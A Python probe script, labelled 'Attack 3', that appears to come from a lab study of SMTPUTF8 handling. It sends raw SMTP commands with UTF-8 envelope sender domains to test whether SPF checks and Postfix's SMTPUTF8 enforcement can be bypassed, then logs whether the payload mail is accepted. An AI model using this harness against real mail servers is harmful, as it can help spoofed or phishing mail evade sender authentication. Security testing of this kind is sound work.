#!/usr/bin/env python3
"""Attack 3: SMTPUTF8 envelope layer (RFC 6531).

MAIL FROM with a UTF-8 (U-label) domain, with and without the SMTPUTF8
parameter, plus UTF-8 local-part control. Question (L2 root cause: multiple
identifier fields): does the SPF policy lookup for a U-label ENVELOPE domain
fall into the same raw-UTF-8-qname void as the From-side (CVE family), and
does Postfix enforce the SMTPUTF8 declaration?
"""
from __future__ import annotations

import argparse
import hashlib
import json
import socket
import sys


def read_reply(fh) -> bytes:
    lines = []
    while True:
        line = fh.readline()
        if not line:
            break
        lines.append(line)
        if len(line) >= 4 and line[3:4] == b" ":
            break
    return b"".join(lines)


def dotstuff(data: bytes) -> bytes:
    lines = data.split(b"\r\n")
    stuffed = []
    for line in lines:
        if line.startswith(b"."):
            line = b"." + line
        stuffed.append(line)
    return b"\r\n".join(stuffed)


def local_ip(server: str, port: int) -> str:
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.connect((server, port))
        return probe.getsockname()[0]
    finally:
        probe.close()


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--server", required=True)
    ap.add_argument("--port", type=int, default=25)
    ap.add_argument("--mail-from", required=True)          # 原样字节：允许 UTF-8
    ap.add_argument("--param", default="")                 # 例如 SMTPUTF8
    ap.add_argument("--rcpt-to", default="bob@lab.test")
    ap.add_argument("--input", required=True)
    ap.add_argument("--transcript", required=True)
    args = ap.parse_args()

    payload = open(args.input, "rb").read()
    digest = hashlib.sha256(payload).hexdigest()
    ip = local_ip(args.server, args.port)
    transcript = [f"CLIENT_IP {ip}", f"PAYLOAD_SHA256 {digest}", f"PAYLOAD_BYTES {len(payload)}"]

    sock = socket.create_connection((args.server, args.port), timeout=60)
    fh = sock.makefile("rb")
    try:
        banner = read_reply(fh)
        transcript.append("S " + banner.decode("utf-8", "replace").replace("\r\n", " | "))

        def cmd(line: str) -> bytes:
            transcript.append("C " + line.encode("utf-8", "replace").decode("utf-8", "replace"))
            sock.sendall(line.encode("utf-8") + b"\r\n")
            reply = read_reply(fh)
            transcript.append("S " + reply.decode("utf-8", "replace").replace("\r\n", " | "))
            return reply

        ehlo = cmd("EHLO client.lab.test")
        mail_line = f"MAIL FROM:<{args.mail_from}>"
        if args.param:
            mail_line += " " + args.param
        mail = cmd(mail_line)
        rcpt = cmd(f"RCPT TO:<{args.rcpt_to}>")
        data = cmd("DATA")
        final = data
        if data.startswith(b"354"):
            blob = dotstuff(payload)
            if not blob.endswith(b"\r\n"):
                blob += b"\r\n"
            sock.sendall(blob + b".\r\n")
            final = read_reply(fh)
            transcript.append("S " + final.decode("utf-8", "replace").replace("\r\n", " | "))
            cmd("QUIT")
    finally:
        sock.close()
        open(args.transcript, "w", encoding="utf-8").write("\n".join(transcript) + "\n")

    text = final.decode("utf-8", "replace").strip()
    print(json.dumps({
        "client_ip": ip,
        "mail_ok": mail.startswith(b"250"),
        "mail_reply": mail.decode("utf-8", "replace").splitlines()[0][:100] if mail else "",
        "reply": text,
        "bytes": len(payload),
        "sha256": digest,
        "accepted": text.startswith("250"),
    }))
    return 0


if __name__ == "__main__":
    sys.exit(main())
